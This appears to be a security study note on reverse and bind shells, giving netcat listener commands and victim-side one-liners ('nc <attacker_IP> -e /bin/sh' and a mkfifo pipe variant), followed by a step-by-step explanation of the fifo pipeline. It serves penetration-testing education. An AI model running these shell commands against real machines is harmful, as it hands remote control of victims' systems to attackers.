---
description: Reverse/bind shell
---

# Gaining shell

### Reverse shell

Given a scenario where an attacker has gained remote code execution privileges on a victim machine, a reverse shell can be established to allow the attacker to gain a remote shell session on the victim machine.

A reverse shell works by establishing a connection from the victim's machine with shell execution, to a listening port on the attacker's machine. This allows any commands sent from the attacker's machine to be executed by the shell on the victim's machine, allowing a remote shell environment.

#### Basic command on attacker machine:

```bash
# Listen on a TCP port
$ nc -lp [port]
```

#### Command to be executed on the victim's machine:

```bash
# option 1
$ nc <attacker_IP> [port] -e /bin/sh


# option 2: -e flag might not be present for some netcat versions
$ rm /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc <attacker_IP> [port] > /tmp/fifo

```

### Bind shell

#### Basic command on attacker machine:

```bash
# Listen on a TCP port
$ nc <victim_IP> <port>
```

#### Command to be executed on the victim's machine:

```bash
# option 1
$ nc -lp [port] -e /bin/sh

# option 2: with $ symbol on attacker machine
$ rm /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc -lp [port] > /tmp/fifo

```



### Explanation for commands use in option 2 of reverse/bind shell

_**What is a fifo (named pipe) file?**_

> ‘mkfifo’ is primarily used when two processes need to communicate with each other but do not have a parent-child relationship. A FIFO special file is an extension of pipes, which offers a pathway for data between two processes. The FIFO special file can be opened by multiple processes for reading and writing. It is especially useful in scenarios where data streaming is necessary.

{% embed url="https://hopeness.medium.com/master-the-linux-mkfifo-command-a-comprehensive-guide-7e64ac926228" %}
mkfifo command
{% endembed %}

1. `rm /tmp/fifo`: Remove the _fifo_ (named pipe) file if it already exists
2. `mkfifo /tmp/fifo:` Create a _fifo_ file at the location `/tmp/fifo` using the `mkfifo` command
3. `cat /tmp/fifo`: Retrieve content of the created _fifo_ file
4. `/bin/sh-i 2>&1:`  Simply executes the current shell, with the `-i` flag for interactive shell mode, and `2>&1` which redirects standard error to standard output, combining both output streams
5. `nc -lp [port] > /tmp/fifo`: Runs the netcat command and sends the output to `/tmp/fifo`.&#x20;

_**Overview**_

These series of commands essentially continuously waits for an input from the attacker machine, before executing it with the current shell, before sending back as input through the established _netcat_ connection:

```bash
cat /tmp/fifo | /bin/sh -i 2>&1 | nc ... > /tmp/fifo
```

a) Attacker sends remote command, which is directed to (`>`) `/tmp/fifo`

b) When the value of `/tmp/fifo`changes, the `cat` command would retrieve the new value and pipe it as input to the `/bin/sh -i 2>&1` command

c) The output from the executed shell command would be piped back as input through the _netcat_ connection to be viewed on the attacker machine



{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux" %}
